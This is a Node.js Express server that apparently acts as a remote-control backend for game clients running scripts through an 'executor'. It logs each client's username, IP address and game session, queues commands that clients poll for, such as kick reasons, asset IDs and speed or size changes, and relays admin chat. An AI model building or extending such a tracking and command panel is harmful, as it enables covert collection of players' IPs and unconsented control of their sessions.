const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE'],
    credentials: false
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();
const messages = new Map();

// API pour enregistrement et heartbeat
app.post('/api', (req, res) => {
    try {
        const { action, userid, username, executor, ip, game, gameId, jobId } = req.body;

        if (!userid) {
            return res.status(400).json({ success: false, error: 'Missing userid' });
        }

        if (action === 'register') {
            players.set(userid.toString(), {
                userid,
                username: username || 'Unknown',
                executor: executor || 'Unknown',
                ip: ip || 'Unknown',
                game: game || 'Unknown',
                gameId: gameId || 0,
                jobId: jobId || 'Unknown',
                lastSeen: Date.now(),
                status: 'online'
            });
            return res.json({ success: true });
        }

        if (action === 'heartbeat') {
            const player = players.get(userid.toString());
            if (player) {
                player.lastSeen = Date.now();
                player.status = 'online';
                return res.json({ success: true });
            }
            return res.json({ success: false });
        }

        res.json({ success: false });
    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// API pour récupérer les commandes
app.get('/api', (req, res) => {
    try {
        const { userid } = req.query;
        
        if (!userid) {
            return res.json({});
        }

        const command = commands.get(userid.toString());
        
        if (command) {
            commands.delete(userid.toString());
            return res.json(command);
        }

        res.json({});
    } catch (error) {
        console.error('Get API Error:', error);
        res.json({});
    }
});

// API pour envoyer des commandes
app.post('/command', (req, res) => {
    try {
        const { userid, command, reason, assetId, speed, size, color, text, imageUrl } = req.body;

        if (!userid || !command) {
            return res.status(400).json({ error: 'Missing data' });
        }

        const commandData = { command };
        if (reason !== undefined) commandData.reason = reason;
        if (assetId !== undefined) commandData.assetId = assetId;
        if (speed !== undefined) commandData.speed = speed;
        if (size !== undefined) commandData.size = size;
        if (color !== undefined) commandData.color = color;
        if (text !== undefined) commandData.text = text;
        if (imageUrl !== undefined) commandData.imageUrl = imageUrl;

        commands.set(userid.toString(), commandData);
        res.json({ success: true });
    } catch (error) {
        console.error('Command Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// API chat - Envoyer un message
app.post('/chat', (req, res) => {
    try {
        const { userid, message, sender } = req.body;
        
        if (!userid || !message) {
            return res.status(400).json({ error: 'Missing data' });
        }

        if (!messages.has(userid.toString())) {
            messages.set(userid.toString(), []);
        }

        const userMessages = messages.get(userid.toString());
        
        // Limiter à 50 messages max par joueur
        if (userMessages.length >= 50) {
            userMessages.shift();
        }

        userMessages.push({
            sender: sender || 'Admin',
            message: message,
            timestamp: Date.now()
        });

        res.json({ success: true });
    } catch (error) {
        console.error('Chat Post Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// API chat - Récupérer les messages
app.get('/chat/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const userMessages = messages.get(userid.toString()) || [];
        res.json(userMessages);
    } catch (error) {
        console.error('Chat Get Error:', error);
        res.json([]);
    }
});

// API pour obtenir la liste des joueurs
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        const playerList = Array.from(players.values()).map(player => ({
            ...player,
            status: (now - player.lastSeen < 15000) ? 'online' : 'offline'
        }));
        res.json(playerList);
    } catch (error) {
        console.error('Players Error:', error);
        res.json([]);
    }
});

// API pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        players.delete(userid);
        commands.delete(userid);
        messages.delete(userid);
        res.json({ success: true });
    } catch (error) {
        console.error('Delete Error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Nettoyage automatique
setInterval(() => {
    try {
        const now = Date.now();
        for (const [userid, player] of players.entries()) {
            if (now - player.lastSeen > 60000) {
                players.delete(userid);
                commands.delete(userid);
                messages.delete(userid);
            }
        }
    } catch (error) {
        console.error('Cleanup Error:', error);
    }
}, 30000);

// Gestion des erreurs globales
app.use((err, req, res, next) => {
    console.error('Global Error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});